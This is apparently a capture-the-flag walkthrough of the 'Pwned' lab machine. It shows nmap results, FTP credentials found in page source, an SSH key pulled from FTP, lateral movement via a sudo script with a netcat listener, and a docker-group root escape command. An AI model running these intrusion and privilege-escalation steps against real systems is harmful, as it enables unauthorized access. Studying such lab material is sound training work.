# [Recon]

```
=========================================================================
[OS]: Debian
[Web-Technology]: Apache httpd 2.4.38
[Hostname]: 6fdaddd70beb
[IP]:  192.168.181.95
[USERS]:
ariana, selena, ajay
=========================================================================
```

# [NMAP RESULTS]
```
=========================================================================
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQPyAx8qSGlWyyuL5xu/6lWdbWs6VArMlRC71wt11kYKMGUTuVmPvLAdSAL66haaz0DCvquZMOmeYNHvM7/OjfmkwlIt3Wv53q/23AODRwPGkpj00QCNH/Vqt6Aw94Afo3etyW9SU3vzLC2F3mS18cqXApmV90NIH3d6ayhsDP+aPuQFoFqEzDxzy2RkosueaEERECT0auT+pTIwRMCHBEVX98Srd8+ax1yhWITRTGOYXcdocx0m9tooFUEH/a1P3RK3gBzCL63ZejMN9YofBl8y+CwCt+0nBLg+PtNjjskD9CaBwxUmH0/UM24z9BQecPn3IFmm3+P5U0z1DQEhf
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDHWpwgF92XD4REIANL7X9lMcQSwcbhlNqwBvNi8l4SzQn5MjSzlBQzgcC7Kro57lCr0kImH+XdijG+r6lyps70=
|   256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHPgRt1LF33Ttn5DuGuJJpmgbMd2ofAkqEt6gTOQK+WW
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
=========================================================================
```

# [Web Services Enumeration]:

![[Pasted image 20240811162214.png]]

```
=========================================================================
- /robots.txt
	- /hidden_text
		- /hidden_text/secret.dic
	- /nothing
- /pwned.vuln
```
![[Pasted image 20240811163133.png]]
- `view-page-source`
```php
<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_Pr!ncesS') {
//		echo "welcome"
//		exit();
// }
// else 
//	echo "Invalid creds"
// }
?>
```
- There it is!! Its the `ftp-credentials`
```bash
ftp 192.168.181.95
# `ftpuser` : `B0ss_Pr!ncesS`
ls -la
cd /share
ls -la
get id_rsa
get note.txt

```

```bash
ssh -i id_rsa ariana@192.168.181.95
sudo -l
# Notice the selena user
```
![[Pasted image 20240811164345.png]]
```bash
sudo -u selena /home/messenger.sh
```
![[Pasted image 20240811164758.png]]
```bash
# Locally
nc -lnvp 9001
```

![[Pasted image 20240811164954.png]]
- Notice the `docker group`

# [PRIVILEGE-ESCALATION]
```bash
ps -eaf --forest | grep -i docker
```
![[Pasted image 20240811165518.png]]

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```


```

=========================================================================
Take Away Concepts (for the flat-file reference system):
* Always check for `robots.txt` and `view-page-source`
* When ever you come across a user input, check for [sql,xss,code exec, etc]
* In the absence of SUIDs and GUIDs, check for running processes, observer groups

```